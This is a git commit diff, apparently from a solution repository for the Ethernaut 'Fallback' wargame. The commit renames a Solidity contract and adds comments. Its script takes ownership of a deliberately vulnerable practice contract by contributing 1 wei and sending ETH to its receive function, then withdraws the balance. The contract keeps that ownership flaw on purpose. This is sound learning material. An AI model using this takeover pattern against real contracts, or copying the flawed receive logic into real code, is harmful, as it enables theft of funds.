8e2ddf103346002d225ca0bf94088d813200d66f
udeshika <perera.n.u@gmail.com>
2024-01-30 04:31:37 +0800

    Format the code

--- script/Fallback.s.sol
+++ script/Fallback.s.sol
@@ -1,18 +1,18 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import {FallbackF} from "../src/FallbackF.sol";
+import {Fallback} from "../src/Fallback.sol";
 import "forge-std/Script.sol";
 import "forge-std/console.sol";
 
 contract FallbackSolution is Script {
 
-    FallbackF public fallbackContract = FallbackF(payable(0x739586e150cBaEd0CB8128dD232c0E2f01757775));
+    Fallback public fallbackContract = Fallback(payable(0x739586e150cBaEd0CB8128dD232c0E2f01757775));
 
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
         fallbackContract.contribute{value:1 wei}();
-        address(fallbackContract).call{value:1 wei}("");
+        address(fallbackContract).call{value:1 wei}("");// Send ETH to recieve function using call 
         fallbackContract.withdraw();
     }
 }
--- src/Fallback.sol
+++ src/Fallback.sol
@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-contract FallbackF {
+contract Fallback {
     mapping(address => uint) public contributions;
     address public owner;
 
@@ -30,7 +30,13 @@ contract FallbackF {
     function withdraw() public onlyOwner {
         payable(owner).transfer(address(this).balance);
     }
-
+    /**
+     * Solution : Send eth to this function 
+     * Description: 
+     * In Solidity, the receive function is a special function that is automatically called when a contract 
+     * receives Ether without any data or when the contract is the target of a plain Ether transfer (a transaction with no function call). 
+     * The receive function is often used as a way to handle and process incoming Ether in a contract.
+     */
     receive() external payable {
         require(msg.value > 0 && contributions[msg.sender] > 0);
         owner = msg.sender;
